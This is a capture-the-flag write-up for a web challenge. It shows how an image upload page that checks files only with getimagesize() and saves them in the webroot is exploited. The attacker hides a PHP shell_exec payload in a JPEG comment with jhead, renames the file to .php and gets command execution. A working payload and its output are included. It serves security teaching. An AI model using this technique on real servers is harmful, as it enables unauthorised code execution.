# image.php

* **Category:** Web
* **Points:** 300

## Challenge
http://appventure.nushigh.edu.sg:15590/

Here's an image editor software I made, I think its super secure since you can only upload images.

## Solution
The URL links to a image upload web application.
Viewing the [source](http://128.199.242.14:15590/upload.php?source),
we can see that the code saves the uploaded file to an uploads directory:
```php
// no overwriting files here because basename ONLY strips paths
$target_resized_file = "uploads/".basename($file_name);
$ok = rename($file_tmp_result_name, $target_resized_file);
```
It also checks that the uploaded file is actually an image.
```php
$check = getimagesize($file_tmp_name);
```
Luckily, [`getimagesize`](https://www.php.net/manual/en/function.getimagesize.php) seems to have some vulnerabilities,
and php docs even warns against its use for image validation:

> Do not use getimagesize() to check that a given file is a valid image. Use a purpose-built solution such as the Fileinfo extension instead.

Uploading an image shows that files are saved to a directory in the webroot.  
Changing the extension of an image to php isn't blocked, and the image displays as usual.  
Most web servers will execute files ending in .php in the webroot. This provides a vector for us to execute our code.  
With some searching, I found a [method](https://security.stackexchange.com/a/53966) for hiding PHP code in a jpeg image.  
It involves manipulation of the JPEG EXIF metadata to add code in the comments field.

### Execution
With this information, we can formulate the exploit.
I used a random JPEG image:
![cat](cat.jpeg)

To edit the JPEG headers, I used [jhead](http://www.sentex.net/~mwandel/jhead/).  
Executing `./jhead -ce cat.jpeg` allows for editing of the JPEG comment.

I used this PHP payload:
```php
<?php echo shell_exec("ls"); __halt_compiler();
```
The `__halt_compiler()` prevents the execution of JPEG data which messes stuff up.  
Reading the modified JPEG file, we can see that our payload is in the JPEG metadata:
```
▒▒▒▒JFIFHH▒▒1<?php echo shell_exec("ls"); __halt_compiler();▒▒ICC_PROFILE                                                                                                                ▒?Q!▒)▒2;▒FQw]▒kpz▒▒▒|▒i▒}▒▒▒0▒▒▒▒▒
...
```

I also had to change the extension of the file from `.jpeg` to `.php` so that the webserver executes our payload.  
The modified image is at [cat.jpeg.php]():
![cat.jpeg.php](cat.jpeg.php)  
The image still loads as normal, so all is good.

Uploading the file and opening the URL in a browser produces:
```
����JFIFHH��1;%0Als -al;.jpg cantcommunicate.png cat.jpeg.php communicate.png file.jpg.php flag.php owowhatsthis.JPG poster.jpg test.jpeg test.jpeg.php test.php
```
This shows a listing of all the files in the current directory, so our exploit worked!  
Once we have a successful code execution payload, it is trivial to modify the payload to locate and read the flag file.

## Flag
`NUSHCTF{D0nt_Upload_Into_Webro0t}`
